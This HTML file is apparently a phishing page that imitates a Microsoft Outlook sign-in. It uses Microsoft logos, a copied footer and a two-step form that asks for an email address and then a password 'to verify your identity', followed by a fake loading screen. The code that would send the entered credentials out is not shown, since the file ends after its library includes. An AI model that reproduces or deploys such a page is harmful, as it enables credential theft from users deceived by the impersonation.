<!doctype html>
<html lang="en">

<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Microsoft | Login</title>
    <!-- <link href="css/hover.css" rel="stylesheet" media="all"> -->
        <script>
footer {
  text-align: left;
}
</script>
  <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACOCAYAAAD5NAC7AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAJdmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdEV2dD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlRXZlbnQjIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpwaG90b3Nob3A9Imh0dHA6Ly9ucy5hZG9iZS5jb20vcGhvdG9zaG9wLzEuMC8iIHhtbG5zOnRpZmY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vdGlmZi8xLjAvIiB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJQYWludC5ORVQgdjMuNS4xMCIgeG1wOkNyZWF0ZURhdGU9IjIwMjAtMDEtMjlUMTY6MTI6NDQrMDU6MDAiIHhtcDpNb2RpZnlEYXRlPSIyMDIwLTAxLTI5VDE2OjE1OjAxKzA1OjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDIwLTAxLTI5VDE2OjE1OjAxKzA1OjAwIiB4bXBNTTpEb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6ZDRkN2JjZjItNjk1NC04NzRmLTg2ZmItMWQxNDJlYWNmNmIyIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmU2OTc1NTc3LWM5YTktYTc0My1hYWM2LWUzNWQyZDFkMGVkZiIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSI3RjE4QjMzODNERjBFRTA0OTk5QjQ1QjlGQTlDNjdGRiIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgdGlmZjpJbWFnZVdpZHRoPSI1NzAiIHRpZmY6SW1hZ2VMZW5ndGg9IjQyNyIgdGlmZjpQaG90b21ldHJpY0ludGVycHJldGF0aW9uPSIyIiB0aWZmOlNhbXBsZXNQZXJQaXhlbD0iMyIgdGlmZjpYUmVzb2x1dGlvbj0iOTYvMSIgdGlmZjpZUmVzb2x1dGlvbj0iOTYvMSIgdGlmZjpSZXNvbHV0aW9uVW5pdD0iMiIgZXhpZjpFeGlmVmVyc2lvbj0iMDIyMSIgZXhpZjpDb2xvclNwYWNlPSIxIiBleGlmOlBpeGVsWERpbWVuc2lvbj0iNTcwIiBleGlmOlBpeGVsWURpbWVuc2lvbj0iNDI3Ij4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6ZGRiMGRmOTMtODg4MC04MjQ5LTg4NjctY2JhNjIzMTAxMmY0IiBzdEV2dDp3aGVuPSIyMDIwLTAxLTI5VDE2OjE1OjAxKzA1OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJjb252ZXJ0ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImZyb20gaW1hZ2UvanBlZyB0byBpbWFnZS9wbmciLz4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImRlcml2ZWQiIHN0RXZ0OnBhcmFtZXRlcnM9ImNvbnZlcnRlZCBmcm9tIGltYWdlL2pwZWcgdG8gaW1hZ2UvcG5nIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDplNjk3NTU3Ny1jOWE5LWE3NDMtYWFjNi1lMzVkMmQxZDBlZGYiIHN0RXZ0OndoZW49IjIwMjAtMDEtMjlUMTY6MTU6MDErMDU6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDQyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOmRkYjBkZjkzLTg4ODAtODI0OS04ODY3LWNiYTYyMzEwMTJmNCIgc3RSZWY6ZG9jdW1lbnRJRD0iN0YxOEIzMzgzREYwRUUwNDk5OUI0NUI5RkE5QzY3RkYiIHN0UmVmOm9yaWdpbmFsRG9jdW1lbnRJRD0iN0YxOEIzMzgzREYwRUUwNDk5OUI0NUI5RkE5QzY3RkYiLz4gPHRpZmY6Qml0c1BlclNhbXBsZT4gPHJkZjpTZXE+IDxyZGY6bGk+ODwvcmRmOmxpPiA8cmRmOmxpPjg8L3JkZjpsaT4gPHJkZjpsaT44PC9yZGY6bGk+IDwvcmRmOlNlcT4gPC90aWZmOkJpdHNQZXJTYW1wbGU+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+5BROkQAAGVpJREFUeAHtwU+wpOdZ3uHf/bzv1//O/LNG2COwDJIVmxjHEFIuKrBkzSLZhkU2bFhlmX3WroJVqsiGZZJFNiziLFiESrmSMiSugJ0gg0yQScZYI2mO5nSf7u97nzvn65mRew6i7aStGtnd1yXbnByv4OSoBSdHLTg5asHJUQtOjlpwctSCk6MWnBy14OSoBd/HanijWw1vdJz8WJJt3vcX//NufvP1X1+/+cY/mk/dEevbdP0ttqLHZcXl9CGj6cNXOURmxyHU3yKBvq6gLKEu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">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="PageID" content="ConvergedSignIn">
  <meta name="SiteID" content="">
  <meta name="ReqLC" content="1033">
  <meta name="LocLC" content="en-US">

    <style type="text/css">
    textarea:hover,
    input:hover,
    textarea:active,
    input:active,
    textarea:focus,
    input:focus,
    button:focus,
    button:active,
    button:hover,
    label:focus,
    .btn:active,
    .btn.active {
        outline: 0px !important;
        -webkit-appearance: none;
        box-shadow: none !important;
    }

    .box {
        box-shadow: 0 2px 3px rgba(0, 0, 0, 0.55);
        border: 1px solid rgba(0, 0, 0, 0.4);
        max-height: 415px;

        max-width: 440px;
        /*width: calc(100% - 40px);*/
        padding: 44px;
        margin-left: auto;
        margin-right: auto;
        margin-top: 20px;
        margin-bottom: 28px;
    }

    #footer {
        position: fixed;
        bottom: 0px;
        width: 100%;
        overflow: visible;
        z-index: 99;
        clear: both;
        background-color: #000;
        background-color: rgba(0, 0, 0, 0.6);
    }

    /*.footerNode span {
    color: #fff;
    font-size: 0.75rem;
    line-height: 28px;
    white-space: nowrap;
    display: inline-block;
    float: right;
    margin-left: 8px;
    margin-right: 8px;
}*/
    div .footerNode a,
    div .footerNode span {
        color: #fff;
        font-size: 0.75rem;
        line-height: 28px;
        white-space: nowrap;
        display: inline-block;
        float: right;
        margin-left: 8px;
        margin-right: 8px;
    }

    @media only screen and (max-width: 610px) {
        #hide {
            display: none;
        }
    }
    </style>
</head>

<body style="background-image: url('images/bg.jpg'); background-size: cover;background-repeat: no-repeat;">
    <div class="container-fluid">
        <div class="container">
            <div class="row my-5 py-5">
                <!-- <div class="col-lg-6" id="hide">
            <div class="text-white my-5 py-3">
              <span class="display-4">Expand Your<br> Microsoft</span><br><br>
              <span class="h5 font-weight-normal">Upgrade to ad-free email and the latest productivity tools with Microsoft.</span><br><br><br>
              <button class="btn btn-white rounded-0 px-5 py-2" style="font-size: 20px; color: #1C9CD6; font-weight: 500;">Get Started</button>
            </div>
          </div> -->
                <div class="col-lg-6 mx-auto">
                    <!-- ////////////////////////div1 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div1">
                        <img src="images/microsoft_logo.svg" class="img-fluid"><br><br>
                        <span class="h5">Sign In</span><br>
                        <span style="font-size: 13px;font-weight: 500">to continue Outlook</span><br>
                     
                        <div class="form-group mt-2">
                            <input type="text" name="email" class="form-control rounded-0 border-dark" id="email" aria-describedby="emailHelp" placeholder="Enter Address, phone number, or skype" style="border-right: none;border-left: none;border-top: none;">
                        </div>
                        <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
                        <p style="font-size: 14px"><a href="#">Can't access your account?</a></p>
                        <p style="font-size: 14px"><a href="#">sign-in options</a></p>
                        <div class="text-right">
                            <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
                        </div>
                    </div>
                    <!-- ////////////////////////div1 end/////////////////////// -->
                    <!-- ////////////////////////div2 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div2" style="display: none;">
                        <form id="contact">
                            <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="img-fluid"><br><br>
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span>
                            <div class="py-2"><span class="h5">Enter Password</span></div>
                            <div class="pb-2">
                                <span id="msg" class="text-danger">Enter password to verify your identity before you continue.</span>
                            </div>
                            <div class="form-group mt-2">
                                <input type="password" name="password" class="form-control rounded-0 border-dark" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                            <p style="font-size: 14px"><a href="#">Forget password?</a></p>
                            <!-- <p style="font-size: 14px"><a href="#">Sign in with a security key</a></p>
                            <p style="font-size: 14px"><a href="#">sign in options</a></p> -->
                            <div class="text-right">
                                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
                            </div>
                        </form>
                    </div>
                    <!-- ////////////////////////div2 end/////////////////////// -->
                    <!-- ////////////////////////div3 start/////////////////////// -->
                    <div class="m-5 p-5 bg-white box" id="div3" style="display: none;min-height: 340px;min-width: 440px;">
                        <img src="images/microsoft_logo.svg" class="img-fluid"><br><br>
                        <div class="text-center mt-3">
                            <span id="load-text" style="font-size: 20px">Please wait..</span>
                            <br><br>
                            <div>
                                <img src="images/loading.gif" class="img-fluid" width="130px">
                            </div>
                        </div>
                    </div>
                    <!-- ////////////////////////div3 end/////////////////////// -->
                </div>
            </div>
        </div>
    </div>
    <footer id="footer">
        <div>
            <div class="footerNode">
                <span>©2020 Microsoft</span>
                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy statement</a>
            </div>
        </div>
    </footer>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
